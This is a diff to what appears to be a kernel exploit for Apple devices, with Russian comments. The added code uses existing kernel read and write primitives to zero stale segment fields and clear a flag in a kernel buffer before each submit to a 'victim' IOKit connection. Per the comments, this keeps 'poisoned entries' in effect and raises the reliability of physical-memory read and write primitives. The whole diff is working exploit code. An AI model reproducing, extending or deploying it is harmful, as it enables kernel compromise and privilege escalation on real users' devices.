@@ -231,6 +231,10 @@ static BOOL kpPhysRead16K(io_service_t svc, const uint8_t *tsdV, uint64_t ttM, u
                 early_kwrite64(rdBuf + 0x30 + (uint64_t)i * 8, (e & 0xffffffff00000000ULL) | tPFN);
             }
             uint8_t fR = 0; kreadbuf(rdBuf + 0x2d, &fR, 1);
+            // 1.9.271 (р.68): зануляем и stale-сегменты [buf+0x10] — иначе при bit1=1
+            // op-4 отдаёт их (оригинальные PA) мимо наших отравленных entries.
+            uint64_t sR = early_kread64(rdBuf + 0x10);
+            if (sR) early_kwrite64(rdBuf + 0x10, 0);
             if (fR & 0x02) {
                 uint64_t fl = early_kread64(rdBuf + 0x28);
                 early_kwrite64(rdBuf + 0x28, (fl & ~(0xffULL << 40)) | ((uint64_t)(fR & ~0x02) << 40));
@@ -314,6 +318,17 @@ static BOOL kpPhysWrite8v2(io_service_t svc, const uint8_t *tsdV, uint64_t ttM, 
         uint64_t eSave = early_kread64(wdBuf + 0x30);
         usleep(1500);
         early_kwrite64(wdBuf + 0x30, (eSave & 0xffffffff00000000ULL) | (uint32_t)(tpage >> 14));
+        // 1.9.271 (р.68): и на записи — bit1=0 + [buf+0x10]=0, иначе stale-ветка
+        // отдаёт buffer+0x10 (оригинальные PA) мимо пропатченных записей.
+        {
+            uint8_t fw = 0; kreadbuf(wdBuf + 0x2d, &fw, 1);
+            uint64_t sW = early_kread64(wdBuf + 0x10);
+            if (sW) early_kwrite64(wdBuf + 0x10, 0);
+            if (fw & 0x02) {
+                uint64_t fl = early_kread64(wdBuf + 0x28);
+                early_kwrite64(wdBuf + 0x28, (fl & ~(0xffULL << 40)) | ((uint64_t)(fw & ~0x02) << 40));
+            }
+        }
         IOSurfaceLock(rdS, 0, NULL);
         uint8_t *rpix = (uint8_t *)IOSurfaceGetBaseAddress(rdS);
         if (rpix) *(uint64_t *)(rpix + boff) = payload;
@@ -7326,6 +7341,17 @@ kpx_submit1: ;
     *(uint32_t *)(tsdV + 0) = srcID;
     *(uint32_t *)(tsdV + 4) = dstID;
     *(uint64_t *)(tsdV + 8) = 1;   // async
+    // 1.9.271 (р.68): и перед victim#1 — bit1=0 + buf+0x10=0 последними записями,
+    // иначе op-4 отдаёт stale-сегменты (оригинальные PA) мимо отравленных entries.
+    if (allBuf) {
+        uint64_t fl = early_kread64(allBuf + 0x28);
+        uint8_t fb = 0; kreadbuf(allBuf + 0x2d, &fb, 1);
+        uint64_t s10 = early_kread64(allBuf + 0x10);
+        if ((fb & 0x02) || s10) {
+            early_kwrite64(allBuf + 0x10, 0);
+            early_kwrite64(allBuf + 0x28, (fl & ~(0xffULL << 40)) | ((uint64_t)(fb & ~0x02) << 40));
+        }
+    }
     kern_return_t avkr = IOConnectCallMethod(victim, 1, NULL, 0, tsdV, sizeof(tsdV), NULL, NULL, NULL, NULL);
     kpNote(r, [NSString stringWithFormat:@"  victim#1 async submit (real src): kr=0x%x — mapping кэшируется на pipe", avkr]);
     // 1.9.263: OPD-пробник+патч на fast-path — в проигрышных бутах (258/259/262c)
@@ -8048,6 +8074,20 @@ kpx_retry: ;   // 1.9.262 fast-path: из victim#1 при nDep>0 — прямо 
                         : (hitForm[i] == 7) ? (gPrimitives.phystokv ? gPrimitives.phystokv(ctlPA) : 0)
                         : (uint64_t)ctlPFN;
             early_kwrite64(hitAddr[i], nq);
+        }
+        // 1.9.271 (р.68): РЕШАЮЩЕЕ — bit1(+0x2d) и stale-сегменты [buf+0x10] в момент
+        // SUBMIT, не патча: промежуточная сериализация до нашего submit выставляет
+        // bit1 и собирает сегменты из ОРИГИНАЛЬНЫХ записей → op-4 отдаёт buffer+0x10
+        // мимо наших отравленных entries (провалившие буты, 25%). Зануляем оба
+        // ПОСЛЕДНИМИ записями перед КАЖДЫМ submit → сериализатор идёт по entries.
+        if (allBuf) {
+            uint64_t fl = early_kread64(allBuf + 0x28);
+            uint8_t fb = 0; kreadbuf(allBuf + 0x2d, &fb, 1);
+            uint64_t s10 = early_kread64(allBuf + 0x10);
+            if ((fb & 0x02) || s10) {
+                early_kwrite64(allBuf + 0x10, 0);
+                early_kwrite64(allBuf + 0x28, (fl & ~(0xffULL << 40)) | ((uint64_t)(fb & ~0x02) << 40));
+            }
         }
         kern_return_t rkr = IOConnectCallMethod(victim, 1, NULL, 0, tsdV, sizeof(tsdV), NULL, NULL, NULL, NULL);
         usleep(400000);
